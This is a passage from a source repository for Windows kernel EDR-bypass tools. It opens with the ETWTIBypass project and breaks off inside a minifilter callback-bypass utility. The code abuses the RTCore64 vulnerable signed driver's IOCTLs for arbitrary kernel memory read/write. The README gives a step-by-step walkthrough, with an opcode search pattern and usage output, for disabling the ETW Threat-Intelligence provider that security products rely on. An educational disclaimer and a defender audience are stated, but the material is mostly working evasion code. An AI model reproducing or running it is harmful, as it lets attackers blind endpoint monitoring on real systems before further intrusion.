</Project>
```

`ETWTIBypass/ETWTIBypass/ETWTIUtil.h`:

```h
#pragma once
#include <Windows.h>
#include <Psapi.h>
#include <stdio.h>
#include <vector>
#include <unordered_map>
#include "ETWTI.h"
#include "MemHandler.h"
#include <map>

// I can hear the OSR replies now... 
#define ProviderEnableInfo_OFFSET 0x60
#define GuidEntry_OFFSET 0x20

//lkd > u
//nt!KeInsertQueueApc + 0x12:
//fffff806`8f880392 4155            push    r13
//fffff806`8f880394 4156            push    r14
//fffff806`8f880396 4157            push    r15
//fffff806`8f880398 4883ec70        sub     rsp, 70h
//fffff806`8f88039c 4c8b15b5dfc700  mov     r10, qword ptr[nt!EtwThreatIntProvRegHandle(fffff806`904fe358)]
//	fffff806`8f8803a3 458be9          mov     r13d, r9d
//	fffff806`8f8803a6 488be9          mov     rbp, rcx
//	fffff806`8f8803a9 4d85d2          test    r10, r10

const uint8_t patternEtwThreatIntProvRegHandle[] = { 0x45, 0x8b, 0xe9, 0x48, 0x8b, 0xe9 };

class ETWTI
{
public:
	ETWTI(MemHandler* objMemHandler);
	~ETWTI();
	PVOID lpNtosBase = { 0 };
	PVOID lpnetioBase = { 0 };
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchCallbackMap;
	std::map<DWORD64, std::pair<DWORD64, DWORD64>> patchLinksMap;
	BOOL EnumerateETW(BOOLEAN REMOVE = false, wchar_t* DriverName = NULL);

private:
	ULONG ulNumFrames;
	PVOID ResolveDriverBase(const wchar_t* strDriverName);
	MemHandler* objMemHandler;
};

```

`ETWTIBypass/ETWTIBypass/MemHandler.cpp`:

```cpp
#include "MemHandler.h"

```

`ETWTIBypass/ETWTIBypass/MemHandler.h`:

```h
#pragma once
#include <Windows.h>
class MemHandler
{
public:
    virtual BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead) = 0;
    virtual BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) = 0;
    virtual BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) = 0;
};


```

`ETWTIBypass/ETWTIBypass/memory.cpp`:

```cpp
#include "memory.h"

Memory::Memory()  {
	/* Constructor for Memory Manager */
	// Opens a handle to RTCORE64
    Memory::DriverHandle = CreateFileW(LR"(\\.\RTCore64)", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    if (Memory::DriverHandle == INVALID_HANDLE_VALUE) {
        printf("Failed to open handle to device\t0x%x\n", GetLastError());
        exit(1);
    }
    else {
        puts("Connected to device");

    }
}

result Memory::ReadMemoryPrimitive(DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    struct result resultdata;
    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
    // Set the status and value in the result structure
    resultdata.resultstatus = response;  // Set TRUE if successful, FALSE if failed
    resultdata.resultvalue = response ? MemoryRead.Value : 0;  // Set value or 0 if failed
    return resultdata;
}

BOOL Memory::WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    BOOL response = DeviceIoControl(Memory::DriverHandle,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return response;
}

BOOL Memory::WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value) {
    BOOL response = false;
    BOOL response2 = false;
    response = WriteMemoryPrimitive(4, Address, Value & 0xffffffff);
    if (response) {
        response2 = WriteMemoryPrimitive(4, Address + 4, Value >> 32);
    }
    else {
        return response;
    }
    return response2;

}

BOOL Memory::VirtualRead(DWORD64 Address, void* Buffer, size_t Size) {
        DWORD bytesRead = 0;
        DWORD offset = 0;
        struct result resultdata;
        while (Size > 0) {
            // Read 4 bytes at a time or less if Size is less than 4 bytes
            DWORD chunkSize = (Size >= 0x04) ? 0x04 : Size;
            resultdata = ReadMemoryPrimitive(chunkSize, Address + offset);
            // Check if the read operation was successful
            if (!resultdata.resultstatus) {
                return false;  // Return false if the read operation fails
            }
            else {
                DWORD chunk = resultdata.resultvalue;
                // Copy the 4-byte chunk into the Buffer
                memcpy((BYTE*)Buffer + offset, &chunk, chunkSize);

                offset += chunkSize;
                Size -= chunkSize;
            }
        }
        return true;
}
```

`ETWTIBypass/ETWTIBypass/memory.h`:

```h
#pragma once
#include <Windows.h>
#include <string>
#include "MemHandler.h"
#include <aclapi.h>

#if !defined(PRINT_ERROR_AUTO)
#define PRINT_ERROR_AUTO(func) (wprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
#endif

struct RTCORE64_MSR_READ {
    DWORD Register;
    DWORD ValueHigh;
    DWORD ValueLow;
};
static_assert(sizeof(RTCORE64_MSR_READ) == 12, "sizeof RTCORE64_MSR_READ must be 12 bytes");

struct RTCORE64_MEMORY_READ {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};
static_assert(sizeof(RTCORE64_MEMORY_READ) == 48, "sizeof RTCORE64_MEMORY_READ must be 48 bytes");

struct RTCORE64_MEMORY_WRITE {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad3[16];
};

struct result {
    DWORD resultvalue;
    BOOL resultstatus;
};

static_assert(sizeof(RTCORE64_MEMORY_WRITE) == 48, "sizeof RTCORE64_MEMORY_WRITE must be 48 bytes");

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

class Memory : public MemHandler {
public:
	HANDLE DriverHandle;
	Memory();
    BOOL VirtualRead(DWORD64 address, void* buffer, size_t bytesToRead);
    result ReadMemoryPrimitive(DWORD Size, DWORD64 Address);
    BOOL WriteMemoryPrimitive(DWORD Size, DWORD64 Address, DWORD Value);
    BOOL WriteMemoryDWORD64(DWORD64 Address, DWORD64 Value);
};
```

`ETWTIBypass/ETWTIBypass/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by FileNetworkKernelBypass.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
#define _APS_NEXT_RESOURCE_VALUE        101
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

```

`ETWTIBypass/Readme.md`:

```md
# ETW-TI Kernel Bypass

## Warning

Even though you can download the binaries from the `releases`, you have to make sure that the offsets and the binary search opcodes done is the same on your windows version or you will get a **BLUE SCREEN OF DEATH**

## Prerequisistes

This is an advanced topic requiring the following prerequisites:

- Assembly understanding

- Familiarity with C programming

- Experience with WinDbg

- Familiarity with IDA

- Windows kernel exploitation knowledge, including R/W primitives

## Tools Used

WinDbg: [Windows Debugging Tools](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/)

IDA: [Hex-Rays IDA Free](https://hex-rays.com/ida-free)

## Kernel Debugging Setup

To debug your local kernel (for fixing your offsets and reversing), follow the instructions here: [Setting up local kernel debugging](https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/setting-up-local-kernel-debugging-of-a-single-computer-manually)

## Target Audience

This project is for both pentesters and defenders to understand how attackers can bypass EDR kernel implementations.

## Purpose

- For everyone to be able to learn how technically bypassing EDR (Network Callbacks) is done.
- For having the flexibility to create your own tool which make it pretty easier to bypass signature based detection.
- For researchers to be able to play around the code and debug and reverse.

## Attacker Abuse Cases

An attacker with administrative privileges may attempt to disable EDR capabilities to install a rootkit for example. To interact with the kernel, a signed Microsoft driver is required. Since unsigned drivers cannot be loaded with Microsoft mitigations enabled (e.g., VBS, Hyper-V), attackers typically exploit vulnerable signed drivers that have not been blacklisted.

**ETWTIBypass llbackKernelBypass project uses RTCORE64.sys driver which is not yet blocklisted by MICROSOFT**

## Introduction to ETW-TI Kernel Bypass

The Event Tracing for Windows (ETW) provider "Windows-Threat-Intelligence (TI)", abbreviated ETW TI in the rest of the article, allows EDRs to receive information about the use of certain Windows APIs. For example, the ETW TI event provider allows you to log NtReadVirtualMemory system calls via the EtwTiLogReadWriteVm function, as well as the associated contextual information (source and destination process, size read, address of the virtual memory concerned, etc.). Because ETW TI functions always check that the ETW TI event provider is enabled (via a call to the EtwProviderEnabled function), one workaround is to make the provider appear disabled.

Reference: https://connect.ed-diamond.com/misc/misc-118/techniques-de-contournement-de-la-supervision-des-edr

## How does it work

Reference: https://connect.ed-diamond.com/misc/misc-118/techniques-de-contournement-de-la-supervision-des-edr

Based on previous research, we know that `nt!EtwThreatIntProvRegHandle` in the handle that we need.

<pre>
lkd> dqs nt!EtwThreatIntProvRegHandle L1
fffff806`904fe358  <mark>ffff950e`64cff810</mark>
</pre>

This handle, used in particular for writing events by the `EtwWrite` function, corresponds to a pointer to the `_ETW_REG_ENTRY` Structure.

<pre>
lkd> dt _ETW_REG_ENTRY ffff950e`64cff810
nt!_ETW_REG_ENTRY
   +0x000 RegList          : _LIST_ENTRY [ 0xffff950e`645c6718 - 0xffff950e`645c6718 ]
   +0x010 GroupRegList     : _LIST_ENTRY [ 0xffff950e`64cff820 - 0xffff950e`64cff820 ]
   <mark>+0x020 GuidEntry        : 0xffff950e`645c66e0 _ETW_GUID_ENTRY</mark>
   +0x028 GroupEntry       : (null) 
   +0x030 ReplyQueue       : 0xfffff806`901fda7a _ETW_REPLY_QUEUE
   +0x030 ReplySlot        : [4] 0xfffff806`901fda7a _ETW_QUEUE_ENTRY
   +0x030 Caller           : 0xfffff806`901fda7a Void
   +0x038 SessionId        : 0
   +0x050 Process          : (null) 
   +0x050 CallbackContext  : (null) 
   +0x058 Callback         : (null) 
   +0x060 Index            : 0
   +0x062 Flags            : 0x41
   +0x062 DbgKernelRegistration : 0y1
   +0x062 DbgUserRegistration : 0y0
   +0x062 DbgReplyRegistration : 0y0
   +0x062 DbgClassicRegistration : 0y0
   +0x062 DbgSessionSpaceRegistration : 0y0
   +0x062 DbgModernRegistration : 0y0
   +0x062 DbgClosed        : 0y1
   +0x062 DbgInserted      : 0y0
   +0x062 DbgWow64         : 0y0
   +0x062 DbgUseDescriptorType : 0y0
   +0x062 DbgDropProviderTraits : 0y0
   +0x064 EnableMask       : 0x1 ''
   +0x065 GroupEnableMask  : 0 ''
   +0x066 HostEnableMask   : 0 ''
   +0x067 HostGroupEnableMask : 0 ''
   +0x068 Traits           : (null) 
</pre>

The _ETW_REG_ENTRY structure contains a GuidEntry attribute that stores a pointer to an _ETW_GUID_ENTRY structure.

<pre>
lkd> dt _ETW_GUID_ENTRY 0xffff950e`645c66e0 
nt!_ETW_GUID_ENTRY
   +0x000 GuidList         : _LIST_ENTRY [ 0xffff950e`64684828 - 0xffff950e`647faca0 ]
   +0x010 SiloGuidList     : _LIST_ENTRY [ 0xffff950e`645c66f0 - 0xffff950e`645c66f0 ]
   +0x020 RefCount         : 0n2
   +0x028 Guid             : _GUID {f4e1897c-bb5d-5668-f1d8-040f4d8dd344}
   +0x038 RegListHead      : _LIST_ENTRY [ 0xffff950e`64cff810 - 0xffff950e`64cff810 ]
   +0x048 SecurityDescriptor : 0xffffc885`0d4d59a0 Void
   +0x050 LastEnable       : _ETW_LAST_ENABLE_INFO
   +0x050 MatchId          : 0x00000114`dcfa5555
   <mark>+0x060 ProviderEnableInfo : _TRACE_ENABLE_INFO</mark>
   +0x080 EnableInfo       : [8] _TRACE_ENABLE_INFO
   +0x180 FilterData       : (null) 
   +0x188 SiloState        : 0xffff950e`64684000 _ETW_SILODRIVERSTATE
   +0x190 HostEntry        : (null) 
   +0x198 Lock             : _EX_PUSH_LOCK
   +0x1a0 LockOwner        : (null) 
</pre>

Within this object is the ProviderEnableInfo field (type _TRACE_ENABLE_INFO) that determines whether or not the event provider is enabled.

<pre>
lkd> dx -id 0,0,ffff950e685b2080 -r1 (*((ntkrnlmp!_TRACE_ENABLE_INFO *)0xffff950e645c6740))
(*((ntkrnlmp!_TRACE_ENABLE_INFO *)0xffff950e645c6740))                 [Type: _TRACE_ENABLE_INFO]
    <mark>[+0x000] IsEnabled        : 0x1 [Type: unsigned long]</mark>
    [+0x004] Level            : 0xff [Type: unsigned char]
    [+0x005] Reserved1        : 0x0 [Type: unsigned char]
    [+0x006] LoggerId         : 0x0 [Type: unsigned short]
    [+0x008] EnableProperty   : 0x40 [Type: unsigned long]
    [+0x00c] Reserved2        : 0x0 [Type: unsigned long]
    [+0x010] MatchAnyKeyword  : 0x114dcfa5555 [Type: unsigned __int64]
    [+0x018] MatchAllKeyword  : 0x0 [Type: unsigned __int64]
</pre>

`IsEnabled` field determines whether or not the event provider is enabled or disabled.

## Code - EnumerateETW Function

We just need to reflect that in our code and and change `IsEnabled` to `0x00`.

First step is to get the virtual address of `nt!EtwThreatIntProvRegHandle`

First let's get the offset to the function from the nt base

<pre>
lkd> ? nt!EtwThreatIntProvRegHandle - nt
Evaluate expression: 15721304 =  <mark>00000000`00efe358</mark>
</pre>

Then copy the `ntoskrnl.exe` from `c:/windows/system32` to open it in IDA.

Then in IDA, first of all we rebase the IMAGEBASE to 0x00, to make the offsets we get in `windbg` from the nt base the actual address in IDA, without any additional calculations.

![IDA Rebase](./screenshots/RebaseProgram.png)

![IDA Rebase](./screenshots/Rebasev2.png)

Then in IDA, lets go to that address by going to `Jump => Jump to Address` and use `00efe358`

![Jump To Address](./screenshots/JumpToAddress.png)

Now we can hover our mouse on `nt!EtwThreatIntProvRegHandle` => click on it => and then press x for cross reference which will tell us who is actually using that handle.

![Cross Reference](./screenshots/crossReference.png)

The first function that pops up is `nt!KeInsertQueueApc` which is using the handle.

<pre>
lkd> u
nt!KeInsertQueueApc+0x12:
fffff806`8f880392 4155            push    r13
fffff806`8f880394 4156            push    r14
fffff806`8f880396 4157            push    r15
fffff806`8f880398 4883ec70        sub     rsp,70h
<mark>fffff806`8f88039c 4c8b15b5dfc700  mov     r10,qword ptr [nt!EtwThreatIntProvRegHandle (fffff806`904fe358)]</mark>
fffff806`8f8803a3 <mark>458be9</mark>          mov     r13d,r9d
fffff806`8f8803a6 <mark>488be9</mark>          mov     rbp,rcx
fffff806`8f8803a9 4d85d2          test    r10,r10
</pre>

<pre>
const uint8_t patternEtwThreatIntProvRegHandle[] = { 0x45, 0x8b, 0xe9, 0x48, 0x8b, 0xe9 };
</pre>

and so now, we need to do a binary search to find the handle, and for the binary search we can use the opcode highlighed (458be9 and 488be9) and start the search for the exported function `nt!KeInsertQueueApc`.

After getting the address of the handle, we just use our Read / Write primitive to enumerate the field and overwrite it.


## Usage

<pre>
C:\Users\Vixx\Desktop\Tools\To Publish\Final\ETWTIBypass\x64\Release>ETWTIBypass.exe /etw /check
Connected to device
StartSearch 7ff7b62e0380
Offset efe358
[+] nt!_ETW_REG_ENTRY : ffff8102dedfe590
[+] nt!_ETW_REG_ENTRY : ffff8102de5bf380
[+] IsEnabled: 1

C:\Users\Vixx\Desktop\Tools\To Publish\Final\ETWTIBypass\x64\Release>ETWTIBypass.exe /etw /disable
Connected to device
StartSearch 7ff7b62e0380
Offset efe358
[+] nt!_ETW_REG_ENTRY : ffff8102dedfe590
[+] nt!_ETW_REG_ENTRY : ffff8102de5bf380

C:\Users\Vixx\Desktop\Tools\To Publish\Final\ETWTIBypass\x64\Release>ETWTIBypass.exe /etw /check
Connected to device
StartSearch 7ff7b62e0380
Offset efe358
[+] nt!_ETW_REG_ENTRY : ffff8102dedfe590
[+] nt!_ETW_REG_ENTRY : ffff8102de5bf380
[+] IsEnabled: 0

C:\Users\Vixx\Desktop\Tools\To Publish\Final\ETWTIBypass\x64\Release>ETWTIBypass.exe /etw /enable
Connected to device
StartSearch 7ff7b62e0380
Offset efe358
[+] nt!_ETW_REG_ENTRY : ffff8102dedfe590
[+] nt!_ETW_REG_ENTRY : ffff8102de5bf380

C:\Users\Vixx\Desktop\Tools\To Publish\Final\ETWTIBypass\x64\Release>ETWTIBypass.exe /etw /check
Connected to device
StartSearch 7ff7b62e0380
Offset efe358
[+] nt!_ETW_REG_ENTRY : ffff8102dedfe590
[+] nt!_ETW_REG_ENTRY : ffff8102de5bf380
[+] IsEnabled: 1
</pre>

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.

```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.11.35222.181
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "MiniFilterFileCallbackernelBypass", "MiniFilterFileCallbackernelBypass\MiniFilterFileCallbackernelBypass.vcxproj", "{973CD09D-B54A-4B52-8771-2EC18BB49241}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.ActiveCfg = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x64.Build.0 = Debug|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.ActiveCfg = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Debug|x86.Build.0 = Debug|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.ActiveCfg = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x64.Build.0 = Release|x64
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.ActiveCfg = Release|Win32
		{973CD09D-B54A-4B52-8771-2EC18BB49241}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {A8101FDA-9036-4CCC-AD4C-6D2CCC772522}
	EndGlobalSection
EndGlobal

```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/FltDef.h`:

```h
#pragma once
#define ASSERT_SZ( x, y ) static_assert(sizeof(x) == y, "incorrect size for " #x);

#ifdef _KERNEL_MODE
#include <ntddk.h>
#else
// begin usermode defs
#include <Windows.h>
#include <winternl.h>

#define IRP_MJ_OPERATION_END 0x80

typedef struct _OWNER_ENTRY {
	DWORD64 OwnerThread;
	DWORD64 TableSize;
}OWNER_ENTRY, * POWNER_ENTRY;

typedef struct _ERESOURCE {
	LIST_ENTRY SystemResourcesList;
	PVOID OwnerTable;
	SHORT ActiveCount;
	WORD Flag;
	PVOID SharedWaiters;
	PVOID ExclWaiters;
	OWNER_ENTRY OwnerEntry;
	ULONG ActiveEntries;
	ULONG ContentionCount;
	ULONG NumberOfSharedWaiters;
	ULONG NumberOfExclusiveWaiters;
	PVOID Reserved2;
	DWORD64 Cbti;
	DWORD64 SpinLock;
}ERESOURCE, * PERESOURCE;
ASSERT_SZ(ERESOURCE, 0x68)

typedef struct _FAST_MUTEX {
	ULONG Count;
	PVOID Owner;
	ULONG Contention;
	PVOID Event[3];
	ULONG OldIrql;
} FAST_MUTEX, * PFAST_MUTEX;
ASSERT_SZ(FAST_MUTEX, 0x38)

typedef struct _KTIMER {
	PVOID Header[3];
	LARGE_INTEGER DueTime;
	LIST_ENTRY TimerListEntry;
	PVOID Kdpc;
	ULONG Processor;
	ULONG Period;
} KTIMER, * PKTIMER;
ASSERT_SZ(KTIMER, 0x40)

typedef struct _KDPC {
	ULONG TargetInfoAsUlong;
	SINGLE_LIST_ENTRY DpcListEntry;
	PVOID ProcessorHistory;
	PVOID DeferredRoutine;
	PVOID DeferredContext;
	PVOID SystemArg1;
	PVOID SystemArg2;
	PVOID DpcData;
}KDPC, * PKDPC;
ASSERT_SZ(KDPC, 0x40)

typedef struct _WORK_QUEUE_ITEM {
	LIST_ENTRY List;
	PVOID WorkerRoutine;
	PVOID Parameter;
}WORK_QUEUE_ITEM, * PWORK_QUEUE_ITEM;
ASSERT_SZ(WORK_QUEUE_ITEM, 0x20)

typedef struct _NPAGED_LOOKASIDE_LIST {
	PVOID ThisTypedefHasBeenLeftAsAnExerciseToTheReader[12];
} NPAGED_LOOKASIDE_LIST, * PNPAGED_LOOKASIDE_LIST;
ASSERT_SZ(NPAGED_LOOKASIDE_LIST, 0x60)

typedef struct _FLT_OPERATION_REGISTRATION {
	UCHAR MajorFunction;
	ULONG Flags;
	PVOID PreOperation;
	PVOID PostOperation;
	PVOID Reserved1;
}FLT_OPERATION_REGISTRATION, * PFLT_OPERATION_REGISTRATION;
ASSERT_SZ(FLT_OPERATION_REGISTRATION, 0x20)

typedef PVOID PKRESOURCEMANAGER;
typedef PVOID PDRIVER_OBJECT;
typedef PVOID PEX_RUNDOWN_REF_CACHE_AWARE;
typedef DWORD64 EX_PUSH_LOCK;
typedef DWORD64 EX_RUNDOWN_REF;
#endif

// end usermode defs

#define OFFSET_FLT_INSTANCE_LIST_ENTRY 0x70
#define CONTEXT_LIST_MAX 50

typedef struct _FLT_RESOURCE_LIST_HEAD {
	ERESOURCE rLock;
	LIST_ENTRY rList;
	ULONG rCount;
} FLT_RESOURCE_LIST_HEAD, * PFLT_RESOURCE_LIST_HEAD;
ASSERT_SZ(FLT_RESOURCE_LIST_HEAD, 0x80)

typedef struct _FLT_MUTEX_LIST_HEAD {
	FAST_MUTEX mLock;
	LIST_ENTRY mList;
	ULONG mCount;
	// mInvalid is the 0th bit of mCount
}FLT_MUTEX_LIST_HEAD, * PFLT_MUTEX_LIST_HEAD;
ASSERT_SZ(FLT_MUTEX_LIST_HEAD, 0x50)

typedef struct _FLTPP_LOOKASIDE_LIST {
	PNPAGED_LOOKASIDE_LIST P;
	PNPAGED_LOOKASIDE_LIST L;
}FLTPP_LOOKASIDE_LIST, * PFLTPP_LOOKASIDE_LIST;
ASSERT_SZ(FLTPP_LOOKASIDE_LIST, 0x10)

typedef struct _FLT_PRCB {
	FLTPP_LOOKASIDE_LIST PPIrpCtrlLookasideLists[2];
}FLT_PRCB, * PFLT_PRCB;

typedef struct _FLTP_IRPCTRL_STACK_PROFILER {
	PVOID Frame;
	ULONG Profile[10];
	KTIMER timer;
	KDPC Dpc;
	WORK_QUEUE_ITEM WorkItem;
	FAST_MUTEX Mutex;
	ULONG WorkItemFlags;
	ULONG Flags;
	ULONG AllocCount;
}FLTP_IRPCTRL_STACK_PROFILER, * PFLTP_IRPCTRL_STACK_PROFILER;

typedef struct _FLTP_FRAME {
	DWORD64 type;
	LIST_ENTRY Links;
	ULONG FrameId;
	UNICODE_STRING AltitudeIntervalLow;
	UNICODE_STRING AltitudeIntervalHigh;
	UCHAR LargeIrpCtrlStackSize;
	UCHAR SmallIrpCtrlStackSize;
	FLT_RESOURCE_LIST_HEAD RegisteredFilters;
	FLT_RESOURCE_LIST_HEAD AttachedVolumes;
	LIST_ENTRY MountingVolumes;
	FLT_MUTEX_LIST_HEAD AttachedFileSystems;
	FLT_MUTEX_LIST_HEAD ZombiedFltObjectContexts;
	PVOID64 KtmResourceManagerHandle;
	PKRESOURCEMANAGER KtmResourceManager;
	ERESOURCE FilterUnloadLock;
	FAST_MUTEX DeviceObjectAttachLock;
	PFLT_PRCB Prcb;
	PVOID PrcbPoolToFree;
	PVOID LookasidePoolToFree;
	FLTP_IRPCTRL_STACK_PROFILER IrpCtrlStackProfiler;
	NPAGED_LOOKASIDE_LIST SmallIrpCtrlLookasideList;
	NPAGED_LOOKASIDE_LIST LargeIrpCtrlLookasideList;
	PVOID ReserveIrpCtrls; // fuck that define it yourself
} FLTP_FRAME, * PFLTP_FRAME;

typedef struct _FLT_OBJECT {
	ULONG Flags;
	ULONG PointerCount;
	EX_RUNDOWN_REF RundownRef;
	LIST_ENTRY PrimaryLink;
	GUID UniqueIdenfitier;
} FLT_OBJECT, * PFLT_OBJECT;

typedef struct _FLT_FILTER {
	FLT_OBJECT Base;
	PVOID Frame;
	UNICODE_STRING Name;
	UNICODE_STRING DefaultAltitude;
	DWORD64 Flags;
	PDRIVER_OBJECT DriverObject;
	FLT_RESOURCE_LIST_HEAD InstanceList;
	PVOID VerifierExtension;
	LIST_ENTRY VerifiedFiltersLink;
	PULONG FilterUnload;
	PULONG InstanceSetup;
	PULONG InstanceQueryTeardown;
	PVOID InstanceTeardownStart;
	PVOID InstanceTeardownComplete;
	PVOID SupportedContextsListHead;
	PVOID SupportedContexts[7];
	PVOID PreVolumeMount;
	PVOID PostVolumeMount;
	PVOID GenerateFileName;
	PVOID NormalizeNameComponent;
	PVOID NormalizeNameComponentEx;
	PVOID NormalizeContextCleanup;
	PVOID KtmNotification;
	PVOID SectionNotification;
	PFLT_OPERATION_REGISTRATION Operations;
	PVOID OldDriverUnload;
	FLT_MUTEX_LIST_HEAD ActiveOpens;
	FLT_MUTEX_LIST_HEAD ConnectionList;
	FLT_MUTEX_LIST_HEAD PortList;
	EX_PUSH_LOCK PortLock;
} FLT_FILTER, * PFLT_FILTER;

typedef struct _CALLBACK_NODE {
	LIST_ENTRY CallbackLinks;
#ifdef _KERNEL_MODE
	PFLT_INSTANCE lpInstance;
#else 
	PVOID lpInstance;
#endif
	PVOID PreOperation;
	PVOID PostOperation;
	PVOID GenerateFileName;
	PVOID NormalizeNameComponent;
	PVOID NormalizeNameComponentEx;
	PVOID NormalizeContextCleanup;
	DWORD64 Flags;
}CALLBACK_NODE, * PCALLBACK_NODE;

typedef struct _FLT_INSTANCE {
	FLT_OBJECT Base;
	PEX_RUNDOWN_REF_CACHE_AWARE OperationRundownRef;
	PVOID lpFltVolume;
	PFLT_FILTER Filter;
	DWORD64 Flags;
	UNICODE_STRING Altitude;
	UNICODE_STRING Name;
	LIST_ENTRY FilterLink;
	EX_PUSH_LOCK ContextLock;
	PVOID lpContext;
	PVOID TransactionContexts;
	PVOID TrackCompletionNodes;
	PCALLBACK_NODE CallbackNodes[50];
}FLT_INSTANCE, * PFLT_INSTANCE;
```

`MiniFilterFileCallbackKernelBypass/MiniFilterFileCallbackernelBypass/FltUtil.cpp`:

```cpp
#include "FltUtil.h"
#include <tchar.h>

PVOID FltManager::ResolveDriverBase(const wchar_t* strDriverName)
{
	DWORD szBuffer = 0x2000;
	BOOL bRes = FALSE;
	DWORD dwSizeRequired = 0;
	wchar_t buffer[256] = { 0 };
	LPVOID lpBase = NULL;
	HANDLE hHeap = GetProcessHeap();
	if (!hHeap) {
		return NULL;
	}

	LPVOID lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, szBuffer);
	if (!lpBuf) {
		return NULL;
	}

	bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
	if (!bRes) {
		HeapFree(hHeap, 0, lpBuf);
		lpBuf = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwSizeRequired);
		if (!lpBuf) {
			return NULL;
		}
		szBuffer = dwSizeRequired;
		bRes = EnumDeviceDrivers((LPVOID*)lpBuf, szBuffer, &dwSizeRequired);
		if (!bRes) {
			printf("Failed to allocate space for device driver base array\n");
			return NULL;
		}
	}

	SIZE_T szNumDrivers = szBuffer / sizeof(PVOID);

	for (SIZE_T i = 0; i < szNumDrivers; i++) {
		PVOID lpBaseIter = ((LPVOID*)lpBuf)[i];
		GetDeviceDriverBaseNameW(lpBaseIter, buffer, 256);
		if (!lstrcmpiW(strDriverName, buffer)) {
			lpBase = lpBaseIter;
			break;
		}
	}

	HeapFree(hHeap, 0, lpBuf);
	return lpBase;
}

PVOID FltManager::ResolveFltmgrGlobals(LPVOID lpkFltMgrBase)
{
	HMODULE hFltmgr = LoadLibraryExA(R"(C:\WINDOWS\System32\drivers\FLTMGR.SYS)", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!hFltmgr) {
		return NULL;
	}

	LPVOID lpFltMgrBase = (PVOID)((SIZE_T)hFltmgr & 0xFFFFFFFFFFFFFF00);

	LPVOID StartSearch = GetProcAddress(hFltmgr, "FltEnumerateFilters");
	LPVOID EndSearch = (LPVOID)((DWORD64)GetProcAddress(hFltmgr, "FltEnumerateFilters") + (DWORD64)0x1000);
	DWORD distance = 0;
	LPVOID pFltGlobals = NULL;

	//FLTMGR!FltEnumerateFilters + 0x81:
	//fffff800`350c90e1 e87a59316e      call    nt!ExInitializeFastOwnerEntry(fffff800`a33dea60)
	//fffff800`350c90e6 4c8b157310fdff  mov     r10, qword ptr[FLTMGR!_imp_KeEnterCriticalRegion(fffff800`3509a160)]
	//fffff800`350c90ed e8fe23326e      call    nt!KeEnterCriticalRegion(fffff800`a33eb4f0)
	//fffff800`350c90f2 41b001          mov     r8b, 1
	//fffff800`350c90f5 488d942480000000 lea     rdx, [rsp + 80h]
	//fffff800`350c90fd 488d0d9476fcff  lea     rcx, [FLTMGR!FltGlobals + 0x58 (fffff800`35090798)]
